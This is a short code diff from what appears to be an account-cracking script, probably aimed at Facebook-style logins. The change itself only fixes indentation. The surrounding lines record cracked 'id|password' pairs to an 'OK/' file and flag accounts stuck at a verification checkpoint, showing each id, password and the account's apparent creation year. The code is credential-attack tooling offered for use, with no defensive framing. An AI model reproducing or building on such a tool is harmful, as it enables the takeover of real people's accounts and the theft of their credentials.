@@ -1052,7 +1052,7 @@ def fankywww(idf, pwv):
                 open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
                 break
             elif po.status_code == 302:
-            	cp += 1
+                cp += 1
                 tree = Tree(Panel.fit(f"""{K2}  CP AKUN BUTUH VERIFIKASI {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                 tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                 tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
